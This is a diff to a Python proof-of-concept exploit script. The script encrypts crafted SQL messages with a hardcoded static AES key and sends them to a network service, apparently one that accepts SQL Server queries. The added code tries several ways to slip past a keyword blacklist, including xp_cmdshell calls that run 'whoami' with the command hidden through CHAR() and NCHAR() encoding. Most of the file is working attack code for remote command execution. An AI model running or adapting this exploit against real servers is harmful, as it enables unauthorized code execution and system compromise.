@@ -2,7 +2,6 @@
 import socket
 import ssl
 import sys
-import hashlib
 import base64
 import json
 import uuid
@@ -11,7 +10,6 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
 KEY_STATIC = "a3(D3$@fK3"
-IV_16_ZERO = b"\x00" * 16
 
 def get_key(password):
     pwd = password.ljust(24, " ") if len(password.encode("utf-8")) < 24 else password[:24]
@@ -25,14 +23,6 @@ def aes_encrypt(plaintext, password):
     cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
     encryptor = cipher.encryptor()
     return base64.b64encode(encryptor.update(data_padded) + encryptor.finalize()).decode("ascii")
-
-def aes_decrypt(cipher_b64, password):
-    key = get_key(password if password else KEY_STATIC)
-    ct = base64.b64decode(cipher_b64.replace(" ", "+"))
-    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
-    decryptor = cipher.decryptor()
-    padded = decryptor.update(ct) + decryptor.finalize()
-    return padded[:-padded[-1]].decode("utf-8")
 
 def process_encrypt_value(plaintext, guid=None):
     if guid is None:
@@ -66,6 +56,20 @@ def send_recv(sock, payload):
             break
     return b"".join(chunks).decode("utf-8", errors="replace")
 
+def try_payload(target, port, use_tls, sql, label):
+    today = datetime.now().strftime("%Y-%m-%d")
+    uid = str(uuid.uuid4()).replace("-", "")[:16]
+    plaintext = f"QUERY-DATA::SQLSERVER:{sql}:{today}|{uid}:admin"
+    payload = process_encrypt_value(plaintext)
+    
+    try:
+        sock = connect(target, port, use_tls)
+        response = send_recv(sock, payload)
+        sock.close()
+        print(f"[{label}] Response: {response[:200]}")
+    except Exception as e:
+        print(f"[{label}] Error: {e}")
+
 def main():
     if len(sys.argv) < 2:
         print("Usage: python v21_poc.py <target_ip> [port] [--no-tls]")
@@ -75,34 +79,24 @@ def main():
     port = int(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("--") else 5758
     use_tls = "--no-tls" not in sys.argv
 
-    today = datetime.now().strftime("%Y-%m-%d")
-    uid = str(uuid.uuid4()).replace("-", "")[:16]
-    sql = "EXEC xp_cmdshell CHAR(119)+CHAR(104)+CHAR(111)+CHAR(97)+CHAR(109)+CHAR(105)"
+    # Test 1: Empty SQL (should pass blacklist)
+    try_payload(target, port, use_tls, "", "empty")
 
-    # Field order: ActionType::ConnType:FileOrSql:SecureHash:UserId
-    # Server replaces '=' with ':' then splits on ':'
-    plaintext = f"QUERY-DATA::SQLSERVER:{sql}:{today}|{uid}:admin"
-    payload = process_encrypt_value(plaintext)
+    # Test 2: PRINT (no blacklisted words)
+    try_payload(target, port, use_tls, "PRINT 1", "print")
 
-    try:
-        sock = connect(target, port, use_tls)
-        response = send_recv(sock, payload)
-        sock.close()
+    # Test 3: EXEC with CHAR-obfuscated command
+    cmd = "whoami"
+    cmd_chars = "+".join(f"CHAR({ord(c)})" for c in cmd)
+    try_payload(target, port, use_tls, f"EXEC xp_cmdshell {cmd_chars}", "exec+char")
 
-        print(f"Target: {target}:{port}")
-        print(f"Response ({len(response)} bytes):")
-        try:
-            print(json.dumps(json.loads(response), indent=2))
-        except:
-            print(response)
-        print()
+    # Test 4: Only command chars (maybe xp_cmdshell is blocked)
+    sql = f"xp_cmdshell {cmd_chars}"
+    try_payload(target, port, use_tls, sql, "xp_cmdshell")
 
-        if "OK" in response or "SUCCESS" in response.upper():
-            print(">>> VULNERABLE <<<")
-        else:
-            print(">>> NOT VULNERABLE <<<")
-    except Exception as e:
-        print(f"Connection failed: {e}")
+    # Test 5: All-obfuscated via EXEC(NCHAR()+...)
+    all_chars = "+".join(f"NCHAR({ord(c)})" for c in "EXEC xp_cmdshell whoami")
+    try_payload(target, port, use_tls, f"EXEC({all_chars})", "exec_nchar")
 
 if __name__ == "__main__":
     main()
